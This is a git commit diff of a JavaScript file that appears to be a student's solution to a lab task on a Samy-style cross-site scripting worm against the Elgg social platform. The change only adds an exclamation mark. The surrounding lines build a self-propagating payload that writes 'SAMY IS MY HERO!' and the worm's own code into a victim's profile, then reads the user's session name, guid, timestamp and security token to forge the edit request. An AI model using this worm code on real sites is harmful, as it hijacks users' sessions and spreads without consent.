d15c7b49a41936ea148b8a7ce4bc2c9fb044b723
Spiny Lumpsucker <165522234+spiny-lumpsucker@users.noreply.github.com>
2024-03-31 20:49:20 -0400

    Exclamation mark

--- project03_task6_link4.js
+++ project03_task6_link4.js
@@ -6,7 +6,7 @@ window.onload = function(){
         "</" + "script>");
 
     // Set the content for the description field
-    var desc ="&description=SAMY IS MY HERO" + wormCode + "&accesslevel[description]=2";
+    var desc ="&description=SAMY IS MY HERO!" + wormCode + "&accesslevel[description]=2";
 
     // Get the name, guid, timestamp, and token
     var name  = "&name=" + elgg.session.user.name;
